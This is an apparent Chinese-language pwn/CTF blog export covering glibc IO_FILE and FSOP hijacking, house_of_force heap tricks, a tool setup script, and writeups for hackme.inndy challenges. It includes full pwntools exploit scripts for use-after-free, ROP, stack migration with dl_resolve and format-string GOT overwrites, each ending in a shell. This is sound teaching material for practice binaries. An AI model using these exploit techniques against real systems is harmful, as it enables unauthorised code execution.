程序中存在后门函数 fake_file =&#39;\0&#39;*0x10 + p64(get_shell)+&#39;\0&#39;*0x70+ p64(buf_addr) fake_file = fake_file.ljust(0xd8,&#39;\0&#39;)+p64(buf_addr) 程序中不存在后门函数 fake_file = &quot;/bin/sh\x00&quot; + &#39;\x00&#39; * 0x8 fake_file += p64(system) + &#39;\x00&#39; * 0x70 # the system can also be placed in other memory fake_file += p64(fake_lock_addr)#指向一处值为0的地址 fake_file = fake_file.ljust(0xd8, &#39;\x00&#39;) fake_file += p64(buf_addr + 0x10 - 0x88) # fake_vtable_addr fclose源码学习文章：blog 等过段时间有时间了在去分析下fclose源码 例子 ： xman 的example1 可以编译成32位和64位来练练手 ，pwnable.tw的seethefile 劫持 stdout文件流指针 通过任意地址写漏洞，将stdout的指针指向伪造的_IO_FILE_plus结构,其中vtable指向伪造的 vtable函数表 这里拿 网鼎杯的那道blind做例子 原本的stdout结构体 gef➤ p *(struct _IO_FILE_plus *) stdout $2 = { file = { _flags = 0xfbad2887, _IO_read_ptr = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, _IO_read_end = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, _IO_read_base = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, _IO_write_base = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, _IO_write_ptr = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, _IO_write_end = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, _IO_buf_base = 0x7f5b6742a6a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, _IO_buf_end = 0x7f5b6742a6a4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7f5b674298e0 &lt;_IO_2_1_stdin_&gt;, _fileno = 0x1, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = &quot;\n&quot;, _lock = 0x7f5b6742b780 &lt;_IO_stdfile_1_lock&gt;, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x7f5b674297a0 &lt;_IO_wide_data_1&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0xffffffff, _unused2 = &#39;\000&#39; &lt;repeats 19 times&gt; }, vtable = 0x7f5b674286e0 &lt;_IO_file_jumps&gt; } 伪造的IO_FILE_plus结构体中的flags要满足下面的条件 flag&amp;8 = 0 and flag &amp;2 =0 and flag &amp; 0x8000 != 0 所以flag的值可以为0xfbad8000 或者0xfbad8080 其他的根据原本的结构体伪造就行了 fake_struct = p64(0x00000000fbad8000) + p64(0x602060)*7 + p64(0x602061) + p64(0)*4 fake_struct += p64(0x602060) + p64(0x1) + p64(0xffffffffffffffff)+ p64(0) fake_struct += p64(0x602060) + p64(0xffffffffffffffff) + p64(0) + p64(0x602060) fake_struct += p64(0)*3 + p64(0x00000000ffffffff) + p64(0) fake_struct += p64(0)+ p64(0x602090 + 0x68*3) fake_vtable = p64(system_addr)*10 + &#39;\n&#39; 伪造后的结构体: gef➤ p *(struct _IO_FILE_plus *)0x602090 $1 = { file = { _flags = 0xfbad8000, _IO_read_ptr = 0x602060 &quot; `&quot;, _IO_read_end = 0x602060 &quot; `&quot;, _IO_read_base = 0x602060 &quot; `&quot;, _IO_write_base = 0x602060 &quot; `&quot;, _IO_write_ptr = 0x602060 &quot; `&quot;, _IO_write_end = 0x602060 &quot; `&quot;, _IO_buf_base = 0x602060 &quot; `&quot;, _IO_buf_end = 0x602061 &quot; `&quot;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x602060, _fileno = 0x1, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = &quot;&quot;, _lock = 0x602060, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x602060, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0xffffffff, _unused2 = &#39;\000&#39; &lt;repeats 19 times&gt; }, vtable = 0x6021c8 } FSOP 这个技术的核心就是劫持_IO_list_all的值来伪造链表和其中的_IO_FILE项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all链表中所有项的文件流，相当于对每个FILE调用fflush，也对应着会调用_IO_FILE_plus.vtable中的IO_overflow函数。 libc版本小于2.24 IO_flush_all_lockp函数源码 _IO_flush_all_lockp (int do_lock) { int result = 0; FILE *fp; #ifdef _IO_MTSAFE_IO _IO_cleanup_region_start_noarg (flush_cleanup); _IO_lock_lock (list_all_lock); #endif for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain) { run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)/*一些检查，需要绕过*/ || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))/*也可以绕过这个*/ ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/ result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; } #ifdef _IO_MTSAFE_IO _IO_lock_unlock (list_all_lock); _IO_cleanup_region_end (0); #endif return result; } IO_flush_all_lockp函数触发条件： 当libc执行abort流程时 abort可以通过触发malloc_printerr来触发 当执行exit函数时 当执行流从main函数返回时 FSOP攻击的前提条件： 泄露出libc地址，知道 _IO_lsit_all的地址 任意地址写的能力，修改 _IO_list_all为可控的地址 可以在可控内存中伪造_IO_FILE_plus结构 _IO_list_all 结构： pwndbg&gt; p *_IO_list_all $1 = { file = { _flags = 0xfbad2086, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;, #这里是我们需要控制的地方，将伪造的_IO_FILE_plus结构链入 _IO_FILE的链表头部 _fileno = 0x2, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = &quot;&quot;, _lock = 0x7ffff7dd3770 &lt;_IO_stdfile_2_lock&gt;, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x7ffff7dd1660 &lt;_IO_wide_data_2&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = &#39;\000&#39; &lt;repeats 19 times&gt; }, vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt; } 伪造的_IO_FILE_plus结构体要绕过的check 1.((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) 或者是 2. _IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base) 一般来说都是伪造前者，因为简单点 具体利用 可以去看 house of orange这道题 新版本libc下的IO_FILE的利用 通过控制 stdin/stdout文件流 内部的_IO_buf_base和 _IO_buf_end来达到任意地址读写的目的 因为进程中包含了系统默认的三个文件流stdin\stdout\stderr，因此这种方式可以不需要进程中存在文件操作，通过scanf\printf一样可以进行利用 _IO_FILE结构 struct _IO_FILE { int _flags; /*flag标志位，用于一些检查 */ /* The following pointers correspond to the C++ streambuf protocol. */ char *_IO_read_ptr; /* Current read pointer */ char *_IO_read_end; /* End of get area. */ char *_IO_read_base; /* Start of putback+get area. */ char *_IO_write_base; /* Start of put area. */ char *_IO_write_ptr; /* Current put pointer. */ char *_IO_write_end; /* End of put area. */ char *_IO_buf_base; /* 操作的起始地址. */ char *_IO_buf_end; /* 操作的结束地址. */ /*控制 _IO_buf_base 和 _IO_buf_end就可以实现任意读写*/ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; /* 用于形成_IO_FILE 链表 int _fileno; int _flags2; __off_t _old_offset; /* This used to be _offset but it&#39;s too small. */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _IO_lock_t *_lock; #ifdef _IO_USE_OLD_IO_FILE }; 任意地址读的例子 from Angelboy大佬 任意地址写的例子 from Angelboy大佬]]></content>
      <categories>
        <category>IO_FILE利用</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn环境]]></title>
    <url>%2F2018%2F09%2F16%2F2018-9-16-pwnenv%2F</url>
    <content type="text"><![CDATA[记录一下我的pwn环境，为以后虚拟机玩坏了要重装做准备先装一手虚拟机，下好ubuntu16.0.4版本的镜像装好镜像地址：https://pan.baidu.com/s/1mhCxGKg 密码：skyf 虚拟机装好后就开始装下面这些东西 32位依赖库 gdb的插件 peda 用来调试堆的插件Pwndbg ROPgadget 做题的工具，用来找gadget的 pwntools 是一个ctf框架和漏洞利用开发库，用python开发的 LibcSearcher用来泄露libc库中函数的偏移的库 one_gadget用来寻找libc库中的execve(‘/bin/sh’, NULL, NULL)可以一个gadget就可以getshell的好东西 安装32位程序运行依赖环境： dpkg --add-architecture i386 sudo apt-get -y install lib32z1 lib32ncurses5 安装peda： git clone https://github.com/longld/peda.git ~/peda echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit 安装Pwndbg: cd ~/ git clone https://github.com/scwuaptx/Pwngdb.git cp ~/Pwngdb/.gdbinit ~/ ROPgadget: 先安装Capstone Capstone是一个轻量级的多平台架构支持的反汇编架构，支持包括ARM\ARM64、MIPC和x64/x86平台。 sudo apt-get install python-capstone 然后，下载好ROPgadget解压进入文件夹中 python setup.py install $ ROPgadget pwntools安装 : 最新版的pwntools会报错 在安装完后再加一条 sudo pip install pyelftools==0.24 就可以了 sudo apt-get update sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential sudo pip install --upgrade pip sudo pip install --upgrade pwntools #可能安装时会遇到很多奇奇怪怪的问题，上网查基本上都可以查得到，要学会科学上网 LibcSearcher安装： git clone https://github.com/lieanu/libc.git cd libc git submodule update --init --recursive sudo python setup.py develop one_gadget安装： 先安装gem sudo apt install ruby 然后 gem install one_gadget 然后还要在windows上装好IDA，这是一款很强大的静态反编译软件(F5大法好，了解一下)可以在52pojie上下，下面贴上网址https://www.52pojie.cn/thread-675251-1-1.html 还有半自动化脚本 #!/bin/bash cd ~/ # change sourse sudo sed -i &#39;s/# deb-src/deb-src/&#39; &quot;/etc/apt/sources.list&quot; # support 32 bit dpkg --add-architecture i386 sudo apt-get update sudo apt-get -y install lib32z1 lib32ncurses5 # download the libc source to current directory sudo apt-get source libc6-dev #install vim sudo apt install vim #install git sudo apt-get -y install git # install peda git clone https://github.com/longld/peda.git ~/peda echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit # install pwndbg git clone https://github.com/pwndbg/pwndbg cd pwndbg sudo ./setup.sh #install gem and one_gadget sudo apt install ruby sudo gem install one_gadget # install pwntools sudo apt-get -y install python python-pip sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential sudo pip install --upgrade pip sudo pip install pwntools sudo pip install pyelftools==0.24 echo &quot;ok have fun with pwn!!&quot;]]></content>
      <categories>
        <category>TOOL</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[top_chunk的玩法]]></title>
    <url>%2F2018%2F09%2F15%2F2018-9-15-topchunk%E7%9A%84%E4%B8%80%E4%BA%9B%E7%8E%A9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[house_of_force是一种通过修改topchunk 的size字段来控制malloc返回包含想要控制地址的chunk的手法，从而达到修改任意地址内容的目的 原理： 假设有一个溢出漏洞，可以改写 top chunk 的size字段，然后将其改为一个非常大的值， 以确保所有的 malloc 将使用 top chunk 分配，而不会调用 mmap。这时如果攻击者 malloc 一个很大的数目（负有符号整数），top chunk 的位置加上这个大数，造成整 数溢出，结果是 top chunk 能够被转移到堆之前的内存地址（如程序的 .bss 段、.data 段、GOT 表等），下次再执行 malloc 时，攻击者就能够控制转移之后地 址处的内存。 house_of_force利用条件： 存在漏洞能控制top_chunk的size大小 能自由控制分配堆的大小 分配的次数不受限制 evil chunk的大小：用目标地址减去 top chunk 地址，再减去 chunk 头的大小。 利用方法： 通过漏洞控制top chunk 的size字段为-1 (32位的话就是0xffffffff,64位的话就是0xffffffffffffffff) 计算出要分配的evil chunk的大小 分配evil chunk 分配目标地址的chunk 同时top_chunk还有另一种玩法假设存在堆溢出漏洞或者其他能修改top chunk size字段的漏洞，加上malloc的大小受用户输入控制 将top chunk size 字段修改为 __free_hook + system - top_chunk _ptr -1 在malloc 一个 _free_hook - top_chunk_ptr - 0x10大小的chunk就可以将__free_hook 地址的内容修改为 top chunk的新size 即 system函数的地址 具体分析下源码： 从topchunk中分配chunk的操作 p = av-&gt;top; size = chunksize (p); /* check that one of the above allocation paths succeeded */ if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset (p, nb); av-&gt;top = remainder; set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, p, nb); return chunk2mem (p); } 如果将top chunk的size字段修改为(system + free_hook - top_chunk_ptr )当分配 free_hook - top_chunk_ptr -0x10时，就会从top chunk 中分配分配完后 ，新topchunk 的size 为 new_size= (system + __free_hook - top_chunk_ptr) - (__free_hook - top_chunk_ptr - 0x10 + 0x10) = system 然后新的top_chunk_ptr 为 old_top_ptr + 分配掉的size new_top_chunk_ptr = top_ptr + ( __free_hook - top_chunk_ptr -0x10) = __free_hook - 0x10 理论上是这样的，但是实际分配的时候还需要考虑到计算size的对齐问题等，所以可以在上面写入的值附近试一试，保证最后可以在__free_hook写入system地址（实际上是system+1，因为topchunk的P标志位会被设为1）地址就行。]]></content>
      <categories>
        <category>Heap_Exploitation</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>houseofxxx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[raas writeup]]></title>
    <url>%2F2018%2F05%2F11%2F2018-5-11-raas-writeup%2F</url>
    <content type="text"><![CDATA[hint:This is a Record-as-a-Service!And also our fist heap-based challenge.Tips: use after free同时题目给了源码很明显这是一个UAF漏洞的利用 防护机制： 题目的数据结构： struct record { void (*print)(struct record *); void (*free)(struct record *); union { int integer; char *string; }; }; 题目用来free的函数 void rec_int_free(struct record *rec) { free(rec); puts(&quot;Record freed!&quot;); } void rec_str_free(struct record *rec) { free(rec-&gt;string); free(rec); puts(&quot;Record freed!&quot;); } void do_dump() { int idx = ask(&quot;Index&quot;); records[idx]-&gt;print(records[idx]); } 因为它free后没有将堆块中的指针清零，同时也没将数组的内容清空，所以这里存在UAF漏洞，这堆块在free掉后还可以使用 生成两个int的record,查看下堆的情况 createint(0,&quot;123&quot;) /*假设分配的堆块为p1*/ createint(1,&quot;123&quot;) /*假设分配的堆块为p2*/ 画个直观图就是下面这样： 将这两个record free掉后，堆的情况 可以看见int类型的record的大小为0x10，chunk_size后面存放了free函数的指针和print函数的指针它们free掉后，根据它们的大小，它们被分到fastbin，根据fastbin的分配规则，后free的chunk块会被先分配。如果这个时候create一个字符型的record[2]，控制字符串大小小于16，那么会将p2分配给record[2]，将p1分配给字符串。 createstr(2,12,&quot;aaaabbbb&quot;) 堆的情况： 可以看到此时p1上的指针已经被”aaaabbbb”给覆盖了 如果将p1的free函数的指针覆盖成system函数，字符串以”sh\x00\x00”开头，再调用do_delete(0),就可以控制程序执行system函数，最终获取shell 解题思路： 先create 两个int的record,然后delete掉它们 然后生成一个字符型的record,字符串的大小为12，以”sh\x00\x00”开头 调用do_delete(0) exp: #!/usr/bin/env python # coding=utf-8 from pwn import* context.log_level = &quot;debug&quot; p = process(&#39;./raas&#39;) system = 0x080484F0 def createint(index,content): p.recvuntil(&quot;&gt;&quot;) p.sendline(str(1)) p.recvuntil(&quot;&gt;&quot;) p.sendline(str(index)) p.recvuntil(&quot;&gt;&quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;&gt;&quot;) p.sendline(content) def createstr(index,size,content): p.recvuntil(&quot;&gt;&quot;) p.sendline(str(1)) p.recvuntil(&quot;&gt;&quot;) p.sendline(str(index)) p.recvuntil(&quot;&gt;&quot;) p.sendline(&quot;2&quot;) p.recvuntil(&quot;&gt;&quot;) p.sendline(str(size)) p.recvuntil(&quot;&gt;&quot;) p.sendline(content) def delete(index): p.recvuntil(&quot;&gt;&quot;) p.sendline(str(2)) p.recvuntil(&quot;&gt;&quot;) p.sendline(str(index)) createint(0,&quot;123&quot;) createint(1,&quot;456&quot;) delete(0) delete(1) payload = &quot;sh\x00\x00&quot; + p32(system) createstr(2,12,payload) delete(0) gdb.attach(p) pause() p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rsbo-1 和 rsbo-2 writeup]]></title>
    <url>%2F2018%2F05%2F11%2F2018-5-11-rsbo-1-%E5%92%8C-rsbo-2-writeup%2F</url>
    <content type="text"><![CDATA[这两道题的文件是一样的，不过一个没要求getshell，一个要求getshll rsbo-1防护机制:只开启了堆栈不可执行题目hint: ROP, open, read很明显要要用ROP调用执行open()函数打开flag文件 然后用read()函数读取文件ida反编译代码** 它先执行init函数 ，打开“/home/ctf/flag”文件，然后读到buf上，再用随机数将buf的内容破坏，最后用memset将buf的内容清零。然后执行read_80_bytes()函数，这里存在溢出点，具体需要填充的字节为108，这个函数读取0x80个字节的内容到v5上，然后将返回值赋给v8,接下来的一个for循环会将会随机破坏内存中的数据，最后调用write()函数输出v5的内容 解题思路： 利用open()函数打开flag文件 利用read()函数将flag读到bss段 利用write()函数将flag打印出来 payload的构造填充的字符要用”\x00”,我看大佬的博客说好像是为了使v8的值为0，绕过循环 exp： #!/usr/bin/env python # coding=utf-8 from pwn import * context.log_level=&quot;debug&quot; p = process(&#39;./rsbo-1&#39;) #p = remote(&#39;hackme.inndy.tw&#39;, 7706) elf = ELF(&#39;./rsbo-1&#39;) start = 0x08048490 open_plt = elf.symbols[&#39;open&#39;] read_plt = elf.symbols[&#39;read&#39;] write_plt = elf.symbols[&#39;write&#39;] log.info(&quot;open_plt --&gt;[%s]&quot;%hex(open_plt)) log.info(&quot;read_plt --&gt;[%s]&quot;%hex(read_plt)) log.info(&quot;read_plt --&gt;[%s]&quot;%hex(write_plt)) bss = elf.bss() offset = 108 flag_add = 0x80487d0 payload = &#39;\x00&#39;*offset + p32(open_plt) + p32(start) + p32(flag_add) + p32(0) p.send(payload) payload1 = &#39;\x00&#39;*offset + p32(read_plt) + p32(start) + p32(0x3) + p32(bss) + p32(0x60) p.send(payload1) payload2 = &#39;\x00&#39;*offset + p32(write_plt) +p32(0xdeadbeef) + p32(1) + p32(bss) + p32(0x60) p.send(payload2) p.interactive() rsbo2hint:Get shell please. Tips: stack migration 它要求我们获取目标主机的shell,同时还给了 migration的提示因为可供我们控制的溢出字节为20 不足以构造出我们getshell的rop链所以要将stack迁移到我们能控制的地方去 这题可以用泄露libc内存的做法来做也可以用_dl_runtime_resolve的做法我用的是_dl_runtime_resolve的做法，最近才学会，就想多练下 栈迁移用到的gadget是 pop_ebp 和 leave_ret这里栈迁移的地址不能是bss段的开头 很神奇，我也不知道为什么会这样我选的地址是bss+0x400 解题思路： migrate stack to bss + 0x400 构造调用read函数和_dl_runtime_resolve函数的rop链 在内存中写入_dl_runtime_resolve函数需要用到的参数 migrate stackpayload = &#39;\x00&#39;*108 + p32(read_80_byte) + p32(pop_ebp) + p32(bss + 0x400) + p32(leave_ret) built rop chainpayload = &#39;a&#39;*4 + p32(read_plt) + p32(ppp_ret) + p32(0) + p32(base_stage) + p32(100) payload += rop.dl_resolve_call(base_stage+20,base_stage) payload += rop.fill(0x80,payload) write argument in base_stagepayload = rop.string(&#39;/bin/sh\x00&#39;) payload += rop.fill(20,payload) payload += rop.dl_resolve_data(base_stage + 20,&#39;system&#39;) payload += rop.fill(100,payload) exp: from pwn import* import pwnlib import roputils context.log_level = &quot;debug&quot; p = remote(&#39;hackme.inndy.tw&#39;, 7706) #p = process(&#39;./rsbo-1&#39;) elf = ELF(&#39;./rsbo-1&#39;) rop = roputils.ROP(&#39;./rsbo-1&#39;) offset = 108 bss = elf.bss() base_stage = bss + 0x800 print hex(base_stage) pop_ebp = 0x0804879f leave_ret = 0x080484f8 pop3_ret = 0x0804879d start = 0x0804867F read_plt = elf.symbols[&#39;read&#39;] log.info(&quot;*********migrate stack***********&quot;) payload = &#39;\x00&#39;*offset + p32(0x804865C) + p32(pop_ebp) + p32(bss+0x400) + p32(leave_ret) p.send(payload) payload1 = &#39;a&#39;*4 +p32(read_plt) + p32(pop3_ret) + p32(0) + p32(base_stage) + p32(100) payload1 += rop.dl_resolve_call(base_stage+20,base_stage) payload1 += rop.fill(0x7f,payload1) p.sendline(payload1) buf = &#39;/bin/sh\x00&#39; buf += rop.fill(20,buf) buf += rop.dl_resolve_data(base_stage + 20,&#39;system&#39;) buf += rop.fill(100,buf) p.send(buf) p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[echo 和 echo2 writeup]]></title>
    <url>%2F2018%2F05%2F10%2F2018-5-10-echo-%E5%92%8C-echo2-writeup%2F</url>
    <content type="text"><![CDATA[hackme.inndy 的echo 和 echo2 echo防护机制： 32位的开启了NX的程序ida反编译一下： 很明显的一个格式化字符串漏洞，加上程序中存在system函数，所以可以将printf_got覆盖成system函数，再传入”/bin/sh” 来getshell这里我用了pwntools库中的fmtstr_payload()函数 exp: from pwn import* context.log_level= &quot;debug&quot; p = remote(&#39;hackme.inndy.tw&#39;,7711) #p = process(&#39;./echo&#39;) elf = ELF(&#39;./echo&#39;) system = elf.symbols[&#39;system&#39;] printf_got = elf.got[&#39;printf&#39;] bss = elf.bss() offset = 7 payload = fmtstr_payload(offset,{printf_got : system}) # change the got of printf to system p.send(payload) p.send(&quot;/bin/sh\x00&quot;) p.interactive() 结果： echo2防护机制： 发现程序开启了PIEPIE：是位置无关的可执行程序，用于生成位置无关的可执行程序，所谓位置无关的可执行程序，指的是，可执行程序的代码指令集可以被加载到任意位置，进程通过相对地址获取指令操作和数据，如果不是位置无关的可执行程序，则该可执行程序的代码指令集必须放到特定的位置才可运行进程。但是低两位字节是固定的，可以通过这个泄露出程序基地址 ida反编译： 发现这题的关键代码和前面那道题很相似，同样是一个格式化字符串漏洞，同样含有system函数，但是这一题是64位的并且开启了PIE的程序，所以需要先泄露出程序的基地址 gdb调试一番： 格式化字符串位于栈上，并且相对偏移为7查看栈上的内容： 程序的栈上有printf函数的返回地址和一些其他函数的返回地址所以可以通过泄露出printf函数的返回地址来计算出程序的基地址 program_base = leakmemory - offset 泄露libc_start_main+240的地址来算出libc的基地址通过在发送payload的语句后加一条gdb.attach(p)语句，进入调试界面，输入vmmap命令，计算出libc_base 和 libc_start_main+240的偏移，那就可以通过泄露出来的地址得到libc_base的地址了，因为不管PIE它的地址怎么变，lib_start_main的地址到libc_base的偏移是不会变的，同时可以得到libc_start_main在libc中的偏移，通过这个偏移可以查到程序的libc的版本libsearch libc_base = __libc_start_main +240 - offset offset = __libc_start_main +240 - 0x7ffff7a0d000 libc_start_main_offset = offset - 240 查到libc的版本 有这么多 ，一般要再泄露多一个地址，比较精准，不过一个个试也可以，这里服务器用的libc版本是 9 获取了lib版本后就可以开始下一步了，我没有用system函数，我用one_gadget这个工具找到了execve(“/bin/sh”,null,environ)的偏移，然后将exit_got覆盖成了one_gadget的地址，因为exit也是libc库中的函数，所以只要覆盖低五位就可以了，我用”%hn”来改写地址的内容，一次修改两个字节，改写完后输入”exit”，就可以getshell 64位需要注意的是： 它的函数地址存在’\x00’截断，所以要将函数地址放到最后 控制好函数地址的相对偏移 exp: #!/usr/bin/env python # coding=utf-8 from pwn import* context.log_level = &quot;debug&quot; p = remote(&quot;hackme.inndy.tw&quot;,7712) #p = process(&#39;./echo2&#39;) elf = ELF(&#39;./echo2&#39;) exit_got = elf.got[&#39;exit&#39;] def memleak(offset): payload = &#39;%&#39; + str(offset) + &quot;$p&quot; p.sendline(payload) data = p.recv()[0:-1] print data data = int(data,16) return data log.info(&quot;************leak program base address************&quot;) _libc_csu_init = memleak(41) p_add = _libc_csu_init - 0xa03 print &quot;base address --&gt;[%s]&quot;%hex(p_add) _libc_start_main_add = memleak(43) - 240 print &quot;_libc_start_main_add --&gt;[%s]&quot;%hex(_libc_start_main_add) _libc_start_main_offset = 0x20740 print &quot;_libc_start_main_offset --&gt; [%s] &quot;%hex(_libc_start_main_offset) libc_base = _libc_start_main_add - _libc_start_main_offset print &quot;libc_base --&gt; [%s]&quot;%hex(libc_base) one_gadget = 0xf0897#execve(&quot;/bin/sh&quot;,null,environ) #one_gadget = 0xf02a4 print &quot;one_gadget --&gt; [%s]&quot;%hex(one_gadget) one_gadget_add = libc_base + one_gadget print &quot;on_gadget_add --&gt; [%s]&quot;%hex(one_gadget_add) log.info(&quot;*********write execve address to exit_got*******&quot;) exit_got = p_add + exit_got print &quot;exit_got --&gt; [%s]&quot;%hex(exit_got) hex_one_gadget = hex(one_gadget_add) add1 = str(int(int(hex_one_gadget[-4:],16))-19) add2 = str(int(int(hex_one_gadget[-8:-4],16))-19) add3 = str(int(int(hex_one_gadget[-12:-8],16))-19) payload1 = &quot;aaaaaaaaaaaaaaaaaaa%&quot; + add1 + &quot;c&quot; + &quot;%10$hn&quot; + p64(exit_got) payload2 = &quot;aaaaaaaaaaaaaaaaaaa%&quot; + add2 + &quot;c&quot; + &quot;%10$hn&quot; + p64(exit_got+2) payload3 = &quot;aaaaaaaaaaaaaaaaaaa%&quot; + add3 + &quot;c&quot; + &quot;%10$hn&quot; + p64(exit_got+4) p.sendline(payload1) p.sendline(payload2) p.sendline(payload3) p.send(&quot;exit\n&quot;) p.interactive() 结果： 写echo2的时候参考了大佬的writeup]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[homework writeup]]></title>
    <url>%2F2018%2F05%2F09%2F2018-5-9-homework-writeup%2F</url>
    <content type="text"><![CDATA[题目：homework (hackme.inndy.tw)hint: Index out bound ,return address ,并且给了程序源码题目防护机制： 开启了NX和Canary源码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; char name[1024]; void call_me_maybe() { system(&quot;/bin/sh&quot;); } void unbuffer_io() { setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); } void set_timeout() { alarm(120); } void ask_name() { printf(&quot;What&#39;s your name? &quot;); gets(name); } void say_goodbye() { printf(&quot;Goodbye, %s\n&quot;, name); } void run_program() { int arr[10], i, v, act; for(i = 0; i &lt; 10; i++) arr[i] = 0; while(1) { puts(&quot;0 &gt; exit&quot;); puts(&quot;1 &gt; edit number&quot;); puts(&quot;2 &gt; show number&quot;); puts(&quot;3 &gt; sum&quot;); puts(&quot;4 &gt; dump all numbers&quot;); printf(&quot; &gt; &quot;); scanf(&quot;%d&quot;, &amp;act); switch(act) { case 0: return; case 1: printf(&quot;Index to edit: &quot;); scanf(&quot;%d&quot;, &amp;i); printf(&quot;How many? &quot;); scanf(&quot;%d&quot;, &amp;v); arr[i] = v; break; case 2: printf(&quot;Index to show: &quot;); scanf(&quot;%d&quot;, &amp;i); printf(&quot;arr[%d] is %d\n&quot;, i, arr[i]); break; case 3: v = 0; for(i = 0; i &lt; 10; i++) v += arr[i]; printf(&quot;Sum is %d\n&quot;, v); break; case 4: for(i = 0; i &lt; 10; i++) printf(&quot;arr[%d] is %d\n&quot;, i, arr[i]); break; } } } int main() { set_timeout(); unbuffer_io(); ask_name(); run_program(); say_goodbye(); return 0; } 通过阅读它的源码可以发现它对数组的下标没有很好的限制，我们可以通过输入一个数组下标和值来改表数组的值，如果输入的数组下标超出了程序数组的大小，就可以改写内存中的值。同时，它程序中存在system函数，结合题目的hint可以推断出这是一个数组下标溢出题，通过下标溢出，将返回地址覆盖成system函数来获取shell 